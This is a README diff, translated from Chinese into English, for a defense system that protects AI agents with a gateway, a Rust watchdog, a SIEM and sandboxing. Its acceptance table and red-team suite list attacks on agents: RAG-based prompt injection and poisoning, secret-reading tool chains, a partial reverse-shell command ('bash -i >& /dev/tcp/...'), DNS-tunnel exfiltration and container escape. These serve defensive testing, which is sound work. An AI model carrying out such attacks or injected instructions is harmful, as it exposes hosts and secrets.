@@ -7,112 +7,232 @@
 
 ---
 
-##  目標 (Objective)
+## Objective
 
-建立一套涵蓋 L7 API 閘道層至 OS 端點層的全方位防禦矩陣。確保在 Agent 遭遇**間接提示詞注入 (Data Poisoning)**、**混淆代理人攻擊 (Confused Deputy)** 或**狀態漂移 (State Drift)** 時，系統能主動識別語意變異，並於底層阻斷未經授權的系統呼叫與資料外洩，確保宿主環境的絕對安全。
+Build a defense matrix covering L7 API Gateway to OS Endpoint layers. Ensure that when agents face **Indirect Prompt Injection (Data Poisoning)**, **Confused Deputy Attacks**, or **State Drift**, the system actively identifies semantic anomalies and blocks unauthorized syscalls and data exfiltration at the OS level.
 
-##  手段 (Methods)
+## Methods
 
-本專案採用「藍隊偵測 + 綠隊隔離」的聯合防禦機制：
+Blue Team detection + Green Team isolation:
 
-1. **跨維度遙測 (Cross-dimensional Telemetry)：** 結合 API 閘道的語意向量分析與 OS 底層（WFP / macOS Endpoint Security）的程序/網路攔截。
-2. **狀態感知 SIEM (Stateful SIEM)：** 將自然語言的對話意圖與底層系統呼叫（Syscalls）進行時間序列的關聯性比對。
-3. **零信任架構與微隔離 (Micro-segmentation)：** 實作動態 IAM 權限降級，並將 Agent 的工具執行環境推入拋棄式沙盒 (Ephemeral Sandboxing)。
+1. **Cross-dimensional Telemetry:** Gateway semantic analysis combined with OS-level (WFP / macOS Endpoint Security) process/network interception.
+2. **Stateful SIEM:** Time-series correlation of natural language intent with underlying syscalls.
+3. **Zero Trust & Micro-segmentation:** Dynamic IAM privilege downgrade with ephemeral agent sandboxing.
 
-##  限制 (Constraints & Limitations)
+## Constraints
 
-* **效能開銷：** 底層的網路封包攔截與 SIEM 關聯分析必須滿足極低延遲，不可對正常 Agent 推論造成超過 50ms 的阻礙。
-* **無狀態假設：** Agent 本身必須設計為無狀態（Stateless），所有的狀態與記憶由外部受控的資料庫管理，以便綠隊隨時銷毀並重啟 Agent 容器。
-* **封閉性網路：** 執行環境必須實施嚴格的出境過濾（Egress Filtering），除白名單 API 外，預設丟棄所有對外連線。
-
----
-
-##  技術棧 (Tech Stack)
-
-* **API Gateway & SIEM Engine:** `Go` (基於 Echo / Gin 框架，提供高併發的語意攔截與日誌接收)。
-* **Endpoint Telemetry Daemon (Watchdog / Gate_God):** `Rust` (利用 WFP API 與 macOS Endpoint Security 實作記憶體安全的底層攔截器)。
-* **Sandboxing:** `Docker` API / `WebAssembly` (Wasmtime)。
-* **Authentication:** 動態 STS Token (AWS IAM / HashiCorp Vault)。
+- **Performance:** Network interception and SIEM correlation must add < 50ms latency.
+- **Stateless Agents:** All state managed externally for instant container destruction.
+- **Egress Filtering:** Default-deny outbound except whitelisted APIs.
 
 ---
 
-##  專案結構 (Repository Structure)
+## Tech Stack
 
-```text
+| Component | Technology | Purpose |
+|-----------|-----------|---------|
+| API Gateway | Go (Echo) | Request interception, semantic analysis, routing |
+| Agent Services | Go + gRPC | Planner, Executor, Summarizer (separate containers) |
+| LLM Backend | Ollama | Local inference: llama3.1:8b, qwen2.5:7b, mistral |
+| Endpoint Watchdog | Rust | macOS ES + Windows WFP syscall interception |
+| SIEM Engine | Go | Correlation engine + Redis Streams |
+| Policy Engine | OPA + SPIRE | Rego policies + workload identity |
+| Sandboxing | Docker API | Ephemeral per-agent containers |
+| Storage | Redis 7 | SIEM hot path (7d hot / 180d cold) |
+| Observability | OpenTelemetry | Traces, metrics, logs |
+| CI/CD | GitHub Actions | Matrix build: windows/amd64, darwin/amd64+arm64, linux/amd64 |
+
+---
+
+## Repository Structure
+
+```
 agentic-defense-matrix/
 ├── .github/
 │   └── workflows/
-│       ├── ci.yml                 # Go & Rust 單元測試與建置
-│       └── red_team_fuzz.yml      # CI/CD 階段的自動化 PyRIT 紅隊越獄測試
+│       ├── ci.yml                 # Go & Rust tests + lint
+│       ├── release.yml            # Cross-platform packaging
+│       └── red_team_fuzz.yml      # Red team attack suite
 ├── cmd/
-│   ├── gateway/                 # Go: API 閘道器與語意變異分析引擎
-│   └── siem_engine/             # Go: 狀態感知關聯分析伺服器
+│   ├── gateway/                   # API Gateway + semantic middleware
+│   ├── siem_engine/               # SIEM correlation engine
+│   ├── control_plane/             # Auto-update server
+│   └── agent/
+│       ├── planner/               # Task decomposition agent
+│       ├── executor/              # Tool execution agent
+│       └── summarizer/            # Response summarization agent
 ├── pkg/
-│   ├── auth/                    # Go: 動態 IAM 與 Token 撤銷邏輯
-│   ├── semantic/                # Go: 提示詞向量化與惡意意圖比對
-│   └── telemetry/               # Go: 日誌格式化與傳輸介面
-├── agents/                      # 微型 Agent 實作 (Planner, Executor, Summarizer)
-│   └── executor/
-│       └── sandbox/             # Docker/Wasm 拋棄式環境設定檔
-├── daemon_watchdog/             # Rust: 部署於端點的藍隊監控代理 (Gate_God核心)
+│   ├── auth/                      # OPA + SPIRE client, JWT management
+│   ├── semantic/                  # Prompt vectorization + intent comparison
+│   ├── telemetry/                 # OTel instrumentation helpers
+│   ├── ollama/                    # Ollama HTTP API wrapper
+│   ├── policy/                    # OPA Rego evaluation client
+│   ├── ringbuffer/                # Lock-free SPSC ring buffer
+│   └── proto/                     # Protobuf service definitions
+├── agents/
+│   └── schemas/                   # OpenAI-compatible tool definitions
+├── daemon_watchdog/               # Rust endpoint watchdog
 │   ├── Cargo.toml
-│   ├── src/
-│   │   ├── main.rs
-│   │   ├── wfp_filter.rs        # Windows Filtering Platform 封包攔截實作
-│   │   ├── macos_es.rs          # macOS Endpoint Security 程序監控實作
-│   │   └── egress_blocker.rs    # 綠隊: 動態出境網路阻擋器
-├── docs/                        # 架構圖與 MITRE ATLAS 威脅建模文件
+│   └── src/
+│       ├── main.rs
+│       ├── wfp_filter.rs          # Windows Filtering Platform
+│       ├── macos_es.rs            # macOS Endpoint Security
+│       ├── egress_blocker.rs      # Dynamic egress blocking
+│       ├── policy_enforcer.rs     # OPA policy evaluation
+│       └── telemetry.rs           # OTel event export
+├── deploy/
+│   ├── docker-compose.yml         # Full stack orchestration
+│   ├── Dockerfile.go              # Multi-stage Go build
+│   ├── Dockerfile.rust            # Rust watchdog build
+│   ├── Dockerfile.opa             # OPA sidecar
+│   ├── watchdog.toml              # Watchdog configuration
+│   ├── otel-collector.yaml        # OTel Collector config
+│   ├── packaging/                 # Platform installers
+│   │   ├── windows/               # MSI + PowerShell
+│   │   ├── macos/                 # .pkg + launchd
+│   │   └── linux/                 # tar.gz + systemd
+│   └── spire/                     # SPIRE + OPA policies
+├── docs/
+│   ├── architecture/
+│   │   ├── system-overview.md     # Mermaid architecture diagrams
+│   │   ├── c4-container.puml      # PlantUML C4 model
+│   │   ├── deployment.md          # Deployment architecture
+│   │   ├── data-flow.md           # Data flow diagrams
+│   │   └── security.md            # Security architecture
+│   ├── threat-model.md            # MITRE ATLAS threat mapping
+│   └── adr/                       # Architecture Decision Records
+│       ├── 001-opa-spire-auth.md
+│       ├── 002-redis-streams-siem.md
+│       ├── 003-separate-agent-services.md
+│       ├── 004-rust-watchdog.md
+│       └── 005-ollama-llm.md
 ├── tests/
-│   └── integration/             # 紅藍隊攻防整合測試腳本
+│   ├── integration/               # Blue/green team integration tests
+│   └── redteam/                   # Red team attack harnesses
+├── scripts/
+│   └── setup-dev.sh               # Development environment setup
+├── .editorconfig
+├── .golangci.yml
+├── Makefile
+├── buf.yaml                       # Protobuf lint config
+├── buf.gen.yaml                   # Protobuf code generation
+├── go.mod
 └── README.md
-
 ```
 
 ---
 
-##  實施方法 (Implementation Methods)
+## Implementation Methods
 
-1. **L7 語意防禦 (Gateway Layer):** 透過 Go 撰寫的 Middleware 攔截所有進入 Agent 的請求，計算短時間內的語意相似度，阻擋自動化高頻紅隊工具。
-2. **OS 行為遏制 (Endpoint Layer):** 部署 Rust 撰寫的 `watchdog` 守護行程，掛載 WFP 過濾器，將 Agent 產生的 Socket 連線與 API Session ID 強制綁定。
-3. **綠隊動態修復 (Green Team Response):** 當 SIEM 判定威脅，觸發 Webhook，透過 API 撤銷該 Session 的 IAM 權限，並發送 SIGKILL 終止該 Agent 所在的沙盒容器。
-
-##  實施計畫 (Implementation Plan)
-
-* **Phase 1: 架構重構與沙盒化 (Week 1-2)**
-* 分離 Agent 的對話與執行模組，建置 Docker/Wasm 拋棄式執行環境。
-
-
-* **Phase 2: 底層攔截器部署 (Week 3-4)**
-* 完成 Rust 端點程式的開發，實作 WFP 網路封包攔截並匯出關聯性日誌。
-
-
-* **Phase 3: SIEM 關聯引擎建置 (Week 5-6)**
-* 使用 Go (Echo/Gin) 建立日誌接收端，撰寫基於 MITRE ATLAS 的時間序列偵測規則。
-
-
-* **Phase 4: 動態權限與自動化阻擋 (Week 7-8)**
-* 整合 IAM 系統，實作威脅觸發時的 Token 撤銷與網路出境封鎖 (Egress Drop)。
-
-
+1. **L7 Semantic Defense (Gateway):** Go middleware intercepts all agent requests, computes short-window semantic similarity to block automated probing.
+2. **OS Behavior Containment (Endpoint):** Rust watchdog daemon with WFP/ES filters binds agent socket connections to session IDs.
+3. **Green Team Auto-Response:** SIEM triggers webhook → Gateway revokes session IAM → Watchdog SIGKILLs container + blocks egress.
 
 ---
 
-##  驗收方法與計畫 (Acceptance Criteria & Plan)
+## Implementation Plan
 
-驗收將採用「自動化 Attacker Agent 靶場對抗」的形式進行。
+### Phase 1: Architecture & Sandboxing (Weeks 1-2)
+- Separate agent dialogue and execution modules
+- Build Docker ephemeral execution environments
+- Ollama wrapper with tool-calling support
+- Protobuf service definitions
+- Docker Compose orchestration
 
-| 測試階段 | 攻擊情境 (Red Team) | 預期防禦行為 (Blue/Green Team) | 驗收標準 |
-| --- | --- | --- | --- |
-| **Stage 1: API 邊界** | 遠端 Agent 發動高頻、語意相似的間接提示詞注入。 | Go Gateway 偵測到語意變異度異常。 | 觸發 Rate Limit，回傳隨機混淆錯誤代碼，成功阻擋 95% 探測。 |
-| **Stage 2: 邏輯濫用** | 混淆代理人攻擊：誘騙 Agent 依序調用讀取機密工具與對外發信工具。 | Rust `watchdog` 捕捉到異常程序的系統呼叫鏈結，SIEM 觸發規則。 | IAM 瞬間降權，外寄動作被沙盒網路層拒絕。 |
-| **Stage 3: 系統滲透** | 利用 RAG 知識庫投毒，誘使 Agent 在本地執行 Reverse Shell 指令。 | macOS ES / WFP 攔截到未經授權的子程序生成 (e.g., `bash -i`)。 | 程序建立失敗，沙盒容器被立刻強制銷毀。 |
+### Phase 2: Endpoint Interceptor (Weeks 3-4)
+- Rust watchdog with macOS Endpoint Security
+- Windows WFP filter implementation
+- Egress blocking with dynamic whitelisting
+- Cross-platform packaging (MSI, .pkg, tar.gz)
+
+### Phase 3: SIEM Correlation Engine (Weeks 5-6)
+- Lock-free ring buffer for hot-path ingestion
+- Redis Streams for event persistence
+- MITRE ATLAS-based correlation rules
+- OTel instrumentation
+
+### Phase 4: Dynamic Permissions & Auto-Response (Weeks 7-8)
+- OPA + SPIRE integration
+- Token revocation on threat detection
+- Egress drop on anomalous behavior
+- End-to-end integration testing
 
 ---
 
-##  學術與資料來源 (References & Academic Sources)
+## Acceptance Criteria
 
-1. **威脅建模體系：** [MITRE ATLAS (Adversarial Threat Landscape for AI Systems)](https://atlas.mitre.org/) - 核心戰術參考 (AML.T0015, AML.T0020)。
-2. **架構安全規範：** [OWASP Top 10 for Large Language Model Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) - 針對 LLM01 (Prompt Injection) 與 LLM08 (Excessive Agency) 的緩解實務。
-3. **風險分析框架：** [Berryville Institute of Machine Learning (BIML) - Architectural Risk Analysis](https://berryvilleiml.com/) - 關於資料與指令邊界模糊的底層設計原則。
-4. **雲端零信任實踐：** [Cloud Security Alliance (CSA) AI Safety Guidelines](https://cloudsecurityalliance.org/) - 動態 IAM 與微服務隔離策略。
-5. **前沿學術理論：** Harvard University `CS 2881: AI Safety` (Boaz Barak) - 關於模型行為邊界 (Model Specs)、紅藍隊對抗與越獄機制的理論基礎。
+| Stage | Attack (Red Team) | Expected Defense (Blue/Green) | Pass Criteria |
+|-------|-------------------|-------------------------------|---------------|
+| Stage 1: API Boundary | High-frequency semantic prompt injection | Gateway detects semantic anomaly | Rate limit triggered, 95% probes blocked |
+| Stage 2: Logic Abuse | Confused deputy: chain read_secret → external_send | Watchdog captures anomaly, SIEM fires rule | IAM revoked, egress denied by sandbox |
+| Stage 3: System Penetration | RAG poisoning → reverse shell spawn | macOS ES / WFP intercepts unauthorized exec (e.g., `bash -i`) | Process creation fails, container destroyed |
+
+---
+
+## Red Team Test Suite
+
+Located in `tests/redteam/`, implemented in Go/Rust:
+
+| ID | Attack | Technique |
+|----|--------|-----------|
+| RT-001 | Prompt Injection | Indirect injection via RAG context |
+| RT-002 | Tool Chaining | read_secret → external_send chain |
+| RT-003 | RAG Poisoning | Inject malicious URLs into knowledge base |
+| RT-004 | Reverse Shell | `bash -i >& /dev/tcp/...` via tool call |
+| RT-005 | Confused Deputy | Trick agent into privilege escalation |
+| RT-006 | Token Theft | Replay captured JWT |
+| RT-007 | Egress Exfiltration | DNS tunnel / HTTP POST to external |
+| RT-008 | Container Escape | Mount host filesystem attempts |
+| RT-009 | Rate Abuse | 1000 req/min automated probing |
+| RT-010 | State Drift | Modify agent context mid-session |
+| RT-011 | LLM Supply Chain | Compromised Ollama model |
+| RT-012 | Log Injection | Crafted payloads in user input |
+| RT-013 | TOCTOU Race | Race condition in policy check |
+| RT-014 | DNS Rebinding | Bypass egress filter via DNS |
+| RT-015 | Privilege Escalation | Exploit Watchdog → root |
+
+---
+
+## Quick Start
+
+```bash
+# Setup development environment
+./scripts/setup-dev.sh
+
+# Start infrastructure
+docker compose up -d redis ollama
+
+# Pull LLM model
+ollama pull llama3.1:8b
+
+# Build everything
+make build
+
+# Run tests
+make test
+
+# Start full stack
+make docker-up
+```
+
+---
+
+## Documentation
+
+- [System Architecture](docs/architecture/system-overview.md) — Mermaid diagrams
+- [C4 Container Model](docs/architecture/c4-container.puml) — PlantUML
+- [Deployment Architecture](docs/architecture/deployment.md) — Service matrix
+- [Data Flow](docs/architecture/data-flow.md) — Event pipelines
+- [Security Architecture](docs/architecture/security.md) — Zero trust model
+- [Threat Model](docs/threat-model.md) — MITRE ATLAS mapping
+- [ADRs](docs/adr/) — Architecture decision records
+
+---
+
+## References
+
+1. [MITRE ATLAS](https://atlas.mitre.org/) — Threat tactics (AML.T0051, AML.T0052, AML.T0054)
+2. [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — LLM01, LLM06, LLM08
+3. [BIML Architectural Risk Analysis](https://berryvilleiml.com/) — Data/instruction boundary principles
+4. [CSA AI Safety Guidelines](https://cloudsecurityalliance.org/) — Dynamic IAM, microservice isolation
+5. [Harvard CS 2881: AI Safety](https://cs2881.seas.harvard.edu/) — Model specs, red/blue team, jailbreak theory
